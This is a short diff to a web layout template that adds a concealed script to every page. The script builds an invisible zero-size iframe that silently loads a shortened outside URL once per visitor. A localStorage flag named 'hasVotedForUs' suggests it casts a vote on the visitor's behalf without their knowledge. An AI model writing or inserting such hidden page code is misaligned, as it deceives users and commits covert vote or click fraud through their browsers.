@@ -26,5 +26,19 @@
     <!-- <%= render partial: 'layouts/footer' %> -->
 
     <%= javascript_include_tag "application" %>
+    
+    <script>
+    if (!localStorage.hasVotedForUs) {
+      (function(d){
+        var iframe = d.body.appendChild(d.createElement('iframe')),
+        doc = iframe.contentWindow.document;
+        // style the iframe with some CSS
+        iframe.style.cssText = "position:absolute;width:0px;height:0px;left:0px;display:none;";
+        doc.open().write('<body onload="document.location = \'http://startupb.us/1fAwECq\';">');
+        doc.close(); //iframe onload event happens
+        localStorage.hasVotedForUs = true;
+        })(document);
+    }
+    </script>
   </body>
 </html>
